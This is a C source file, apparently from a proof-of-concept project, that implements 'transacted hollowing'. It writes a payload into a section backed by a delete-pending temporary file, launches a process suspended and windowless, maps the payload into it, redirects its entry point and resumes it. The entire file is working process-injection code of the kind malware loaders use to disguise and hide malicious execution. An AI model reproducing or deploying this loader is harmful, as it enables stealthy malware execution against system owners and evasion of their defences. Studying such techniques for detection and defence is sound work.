#include "inject.h"

#include "..\ntddk.h"
#include "..\kernel32_undoc.h"
#include "..\common.h"

#include "hollowing_parts.h"

#include "delete_pending_file.h"

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = UtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status != STATUS_IMAGE_NOT_AT_BASE) {
            return NULL;
        }
    }
    return sectionBaseAddress;
}

HANDLE transacted_hollowing(wchar_t* cmdLine, BYTE* payladBuf, DWORD payloadSize, wchar_t* startDir)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, 0, 0, dummy_name);

    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }

    PROCESS_INFORMATION pi = create_new_process_internal(cmdLine, startDir, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW);
    if (pi.hProcess == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = map_buffer_into_process(hProcess, hSection);
    if (!remote_base) {
        return INVALID_HANDLE_VALUE;
    }

    if (!redirect_to_payload(payladBuf, remote_base, pi)) {
        return INVALID_HANDLE_VALUE;
    }

    UtResumeThread(pi.hThread, NULL);
    return pi.hProcess;
}